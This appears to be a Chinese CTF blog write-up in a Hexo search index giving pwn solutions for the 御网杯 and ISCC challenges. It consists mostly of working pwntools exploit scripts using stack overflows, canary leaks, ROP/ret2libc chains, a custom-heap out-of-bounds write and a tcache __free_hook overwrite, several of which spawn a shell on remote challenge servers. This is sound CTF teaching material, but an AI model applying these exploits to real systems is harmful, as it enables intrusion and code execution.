<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>御网杯和ISCC——pwn方向wp</title>
      <link href="/2025/05/16/%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%92%8CISCC%E2%80%94%E2%80%94pwn%E6%96%B9%E5%90%91wp/"/>
      <url>/2025/05/16/%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%92%8CISCC%E2%80%94%E2%80%94pwn%E6%96%B9%E5%90%91wp/</url>
      
        <content type="html"><![CDATA[<p>打完御网杯和ISCC，发现网络上并没有PWN的解，于是就简单写一下，御网杯和ISCC的所有pwn解</p><h2 id="御网杯"><a href="#御网杯" class="headerlink" title="御网杯"></a>御网杯</h2><h3 id="pwn-canary"><a href="#pwn-canary" class="headerlink" title="pwn canary"></a>pwn canary</h3><p>通过覆盖canary后再次生成canary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;47.105.113.86&quot;</span>,<span class="number">30001</span>)</span><br><span class="line">elfs = ELF(<span class="string">&quot;./Canary&quot;</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x401579</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_magic</span>(<span class="params">payload</span>):</span><br><span class="line">     io.recvuntil(<span class="string">&quot;your choice&quot;</span>)</span><br><span class="line">     io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">     io.recvuntil(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">     io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_canary</span>():</span><br><span class="line">        io.recvuntil(<span class="string">&quot;your choice&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;But now, I have a new Secret.&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">        io.recvuntil(<span class="string">&quot;your choice&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x70</span>-<span class="number">4</span>)+p32(<span class="number">0</span>) + p64(<span class="number">0</span>)+p64(ret) +p64(magic)</span><br><span class="line">pause()</span><br><span class="line">input_magic(payload)</span><br><span class="line">set_canary()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn-ez-pwn"><a href="#pwn-ez-pwn" class="headerlink" title="pwn ez_pwn"></a>pwn ez_pwn</h3><p>禁用stdout，转流到stderr，执行命令时运行同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag &gt;&amp;2</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;47.105.113.86&quot;</span>,<span class="number">30003</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ez_pwn&quot;)</span></span><br><span class="line">elfs = ELF(<span class="string">&quot;./ez_pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elfs.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elfs.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rdi_ret = <span class="number">0x00000000004012c3</span></span><br><span class="line">rsi_ret_pop = <span class="number">0x00000000004012c1</span></span><br><span class="line"></span><br><span class="line">test1 =p64(elfs.symbols[<span class="string">&#x27;init&#x27;</span>]) + p64(elfs.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">offset = <span class="string">b&quot;b&quot;</span>*(<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">payload = offset + p64(rdi_ret)+p64(<span class="number">2</span>)+p64(rsi_ret_pop)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(elfs.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_real = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_real))</span><br><span class="line">base_addr = write_real - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">shell = base_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = offset +p64(rdi_ret)+p64(bin_sh) +p64(shell)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="special-malloc"><a href="#special-malloc" class="headerlink" title="special malloc"></a>special malloc</h3><p>主函数逻辑（以下代码经过我分析处理）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_0(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, input);</span><br><span class="line">      getchar();</span><br><span class="line">      v3 = (<span class="type">const</span> <span class="type">char</span> *)str2base64(input);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(<span class="string">&quot;YWRk&quot;</span>, v3) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = (<span class="type">const</span> <span class="type">char</span> *)str2base64(input);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;ZGVsZXRl&quot;</span>, v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      del();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="type">const</span> <span class="type">char</span> *)str2base64(input);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;c2hvd2l0&quot;</span>, v5) )</span><br><span class="line">      &#123;</span><br><span class="line">        showit();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (<span class="type">const</span> <span class="type">char</span> *)str2base64(input);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;ZWRpdGl0&quot;</span>, v6) )</span><br><span class="line">        &#123;</span><br><span class="line">          editit();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = (<span class="type">const</span> <span class="type">char</span> *)str2base64(input);</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;Y2F0X2ZsYWdz&quot;</span>, v7) &amp;&amp; dword_6020F0 == <span class="number">305419896</span> )</span><br><span class="line">            cat_flags();</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出是一个通过base64来进行目录操控的程序，结合内容和名称可以分析出他是自己实现了一个堆生成器</p><h4 id="new"><a href="#new" class="headerlink" title="new"></a>new</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400A9D</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> delta[<span class="number">3</span>]; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !flag )</span><br><span class="line">    init2();<span class="comment">//仅第一便运行时，确定sbrk_now（sbrk堆开始的初始值）和sbrk_offset当前堆值</span></span><br><span class="line">  delta[<span class="number">2</span>] = <span class="number">0</span>; </span><br><span class="line">    <span class="comment">/* delta 0为chunk长度  */</span></span><br><span class="line">  v3 = (_DWORD *)sbrk_now;</span><br><span class="line">  *(_QWORD *)delta = (<span class="type">unsigned</span> <span class="type">int</span>)(a1 + <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v3 != (_DWORD *)sbrk_offset )<span class="comment">//遍历最后一个外的所有堆块</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *v3 &amp;&amp; v3[<span class="number">1</span>] &gt;= (<span class="type">int</span>)delta[<span class="number">0</span>] )<span class="comment">//当堆块释放并且满足大小大于申请时可以重利用</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v3 = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)&amp;delta[<span class="number">1</span>] = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">2</span>] )<span class="comment">//有重利用地址时返回重利用地址</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)v3[<span class="number">2</span>];</span><br><span class="line">      v3[<span class="number">2</span>] = (_DWORD)v3;<span class="comment">//无重利用地址时为重利用地址赋值（正常情况下第一次调用只标记不重利用，第二次重利用）</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = (_DWORD *)((<span class="type">char</span> *)v3 + (<span class="type">int</span>)v3[<span class="number">1</span>]);<span class="comment">//下一个堆</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_QWORD *)&amp;delta[<span class="number">1</span>] )<span class="comment">//申请后更新信息</span></span><br><span class="line">  &#123;</span><br><span class="line">    sbrk(delta[<span class="number">0</span>]);</span><br><span class="line">    *(_QWORD *)&amp;delta[<span class="number">1</span>] = sbrk_offset;</span><br><span class="line">    sbrk_offset += (<span class="type">int</span>)delta[<span class="number">0</span>];</span><br><span class="line">    *(_DWORD *)(*(_QWORD *)&amp;delta[<span class="number">1</span>] + <span class="number">4LL</span>) = delta[<span class="number">0</span>];</span><br><span class="line">    **(_DWORD **)&amp;delta[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)&amp;delta[<span class="number">1</span>] + <span class="number">12LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据申请可以分析出堆块结构</p><p><img src="https://www.helloimg.com/i/2025/05/16/682611890629f.png" alt="image-20250515233451048.png"></p><h3 id="editit漏洞利用点"><a href="#editit漏洞利用点" class="headerlink" title="editit漏洞利用点"></a>editit漏洞利用点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 editit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char buf[8]; // [rsp+10h] [rbp-10h] BYREF</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  read(0, buf, 4uLL);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  if ( *(&amp;::buf + v1) )</span><br><span class="line">    read(0, *(&amp;::buf + v1), 0x80uLL);</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以越界写</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>首先申请3个堆块，并释放第二个，此时堆块状态为</p><p><a href="https://www.helloimg.com/i/2025/05/16/6826121e6194b.png"><img src="https://www.helloimg.com/i/2025/05/16/6826121e6194b.png" alt="image-20250515234247756.png"></a></p><p>然后如果正常情况下new会先将蓝色的0变为len处地址，然后向下开开辟新堆块4，第二次new才会重利用蓝色堆块。但我们可以通过直接写绿色堆块进行覆盖到蓝色，然后将magic地址写入蓝色</p><p><a href="https://www.helloimg.com/i/2025/05/16/6826118a54f46.png"><img src="https://www.helloimg.com/i/2025/05/16/6826118a54f46.png" alt="image-20250515234720437.png"></a></p><p>此时当执行到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( v3[2] )//有重利用地址时返回重利用地址</span><br><span class="line">  return (int)v3[2];</span><br></pre></td></tr></table></figure><p>时，就会认为这个是可以进行重利用，并将magic地址作为堆块返回，那么下一次修改的位置就为magic</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./malloc_special&quot;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def new_buf():</span><br><span class="line">    io.sendline(b&quot;add&quot;)</span><br><span class="line">    </span><br><span class="line">def free_buf(index):</span><br><span class="line">    io.sendline(b&quot;delete&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    </span><br><span class="line">def print_buf(index):</span><br><span class="line">    io.sendline(b&quot;showit&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    </span><br><span class="line">def write_buf(index,context):</span><br><span class="line">    io.sendline(b&quot;editit&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.send(context)</span><br><span class="line">    </span><br><span class="line">def backdoor():</span><br><span class="line">    io.sendline(b&quot;cat_flags&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot;*28+p64(0x0000002c00000001)+p32(0x06020F0)+p32(0x06020F0)</span><br><span class="line">magic_num = p32(305419896)</span><br><span class="line"></span><br><span class="line">new_buf()</span><br><span class="line">new_buf()</span><br><span class="line">new_buf()</span><br><span class="line"></span><br><span class="line">free_buf(1)</span><br><span class="line">write_buf(0,payload)</span><br><span class="line"></span><br><span class="line">new_buf()</span><br><span class="line">write_buf(2,magic_num)</span><br><span class="line">backdoor()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ISCC"><a href="#ISCC" class="headerlink" title="ISCC"></a>ISCC</h2><p>格式化字符串偏移泄露canary，然后就是64位rop链构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from code import interact</span><br><span class="line">from pwn import *</span><br><span class="line">libc = ELF(&quot;./pwn&quot;)</span><br><span class="line">context.log_level= &quot;debug&quot;</span><br><span class="line">io = remote(&quot;101.200.155.151&quot;,12400)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&quot;AAAA%23$X&quot;)</span><br><span class="line">io.recv()</span><br><span class="line">p = io.recv()</span><br><span class="line">canary = int(p[4:12],16)</span><br><span class="line">io.send(b&quot;a&quot;*64+p32(canary)+b&quot;a&quot;*12+p32(libc.plt[&#x27;puts&#x27;])+p32(libc.symbols[&#x27;main&#x27;])+p32(libc.got[&#x27;puts&#x27;]))</span><br><span class="line">puts_real = io.recvuntil(&#x27;\xf7&#x27;)</span><br><span class="line">puts_real = u32(puts_real)</span><br><span class="line">base_addr = puts_real - 0x072880</span><br><span class="line">system_real = base_addr + 0x047cd0</span><br><span class="line">sh_real = base_addr + 0x1b90d5</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&quot;AAAA%23$X&quot;)</span><br><span class="line">io.recv()</span><br><span class="line">p = io.recv()</span><br><span class="line">canary = int(p[4:12],16)</span><br><span class="line">io.send(b&quot;a&quot;*64+p32(canary)+b&quot;a&quot;*12+p32(system_real)+p32(libc.symbols[&#x27;main&#x27;])+p32(sh_real))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>本体思路是先通过最开始的UAF进行修改magic为255，来泄露carnary然后进行栈溢出执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">io = remote(&quot;101.200.155.151&quot;,12200)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004014c3 # pop rdi ; ret</span><br><span class="line">ret = 0x40101a </span><br><span class="line">libc = ELF(&quot;./pwn&quot;)</span><br><span class="line">#io = process(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;size:\n&#x27;)</span><br><span class="line">io.sendline(b&quot;100&quot;)</span><br><span class="line">io.recvuntil(b&quot;flag:\n&quot;)</span><br><span class="line">io.sendline(b&quot;flag&quot;)</span><br><span class="line"></span><br><span class="line">io.recvline(b&quot;welcome to ISCC&quot;)</span><br><span class="line">io.send(b&quot;a&quot;*24+b&quot;b&quot;)</span><br><span class="line">io.recvuntil(b&quot;b&quot;)</span><br><span class="line">carnary = u64(io.recv(7).rjust(8,b&quot;\x00&quot;))</span><br><span class="line">io.recvuntil(b&quot;meet you&quot;)</span><br><span class="line">print(carnary)</span><br><span class="line">io.sendline(b&quot;a&quot;*24+p64(carnary)+b&quot;v&quot;*8+p64(pop_rdi)+p64(libc.got[&#x27;puts&#x27;])+p64(libc.plt[&#x27;puts&#x27;])+p64(libc.symbols[&#x27;main&#x27;]))</span><br><span class="line">io.recvuntil(b&quot;too!\n&quot;)</span><br><span class="line">puts_real = u64(io.recvuntil(b&quot;\x7f&quot;).ljust(8,b&quot;\x00&quot;))</span><br><span class="line">print(hex(puts_real))</span><br><span class="line"></span><br><span class="line">base_addr = puts_real - 0x084420</span><br><span class="line">system_real = base_addr + 0x052290</span><br><span class="line">sh_real = base_addr + 0x1b45bd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvline(b&quot;welcome to ISCC&quot;)</span><br><span class="line">io.send(b&quot;a&quot;*24+b&quot;b&quot;)</span><br><span class="line">io.recvuntil(b&quot;b&quot;)</span><br><span class="line">carnary = u64(io.recv(7).rjust(8,b&quot;\x00&quot;))</span><br><span class="line">io.recvuntil(b&quot;meet you&quot;)</span><br><span class="line">print(carnary)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(b&quot;a&quot;*24+p64(carnary)+b&quot;v&quot;*8+p64(pop_rdi)+p64(sh_real)+p64(ret)+p64(system_real)+p64(libc.symbols[&#x27;main&#x27;]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>堆溢出+uaf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = remote(&#x27;101.200.155.151&#x27;, 12700)</span><br><span class="line">#io=process(&#x27;./attachment-13&#x27;)</span><br><span class="line">elf = ELF(&#x27;./attachment-13&#x27;)</span><br><span class="line">libc=ELF(&#x27;./attachment-13.6&#x27;) #2.27</span><br><span class="line">def create(idx,size):</span><br><span class="line">io.sendlineafter(b&quot;your choice:\n&quot;, b&quot;1&quot;)</span><br><span class="line">io.sendlineafter(b&quot;coordinate:\n&quot;, str(idx)) </span><br><span class="line">io.sendlineafter(b&quot;required:\n&quot;, str(size))</span><br><span class="line">def show(idx):</span><br><span class="line">io.sendlineafter(b&quot;your choice:\n&quot;, b&quot;4&quot;)</span><br><span class="line">    io.sendlineafter(b&#x27;cosmic truth:\n&#x27;,str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">io.sendlineafter(b&quot;your choice:\n&quot;, b&quot;2&quot;)</span><br><span class="line">    io.sendlineafter(b&#x27;cleanse:\n&#x27;,str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">io.sendlineafter(b&quot;your choice:\n&quot;, b&quot;3&quot;)</span><br><span class="line">    io.sendlineafter(b&#x27;inscription:\n&#x27;,str(idx))</span><br><span class="line">    io.sendlineafter(b&quot;length:\n&quot;, str(size))</span><br><span class="line">    io.sendafter(b&quot;truth:\n&quot;, content)</span><br><span class="line">create(0,0x410)</span><br><span class="line">create(1,0x20) </span><br><span class="line">create(2,0x20)</span><br><span class="line">create(3,0x20)</span><br><span class="line">create(4,0x20)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">leak_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak_addr - 0x3ebca0</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">free(2)</span><br><span class="line">free(3)</span><br><span class="line">edit(3,0x8,p64(free_hook))</span><br><span class="line">create(2,0x20)</span><br><span class="line">create(3,0x20)</span><br><span class="line">edit(3,0x8,p64(system)) </span><br><span class="line">edit(4,0x8,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">free(4)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
          <category> 网鼎杯2024 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
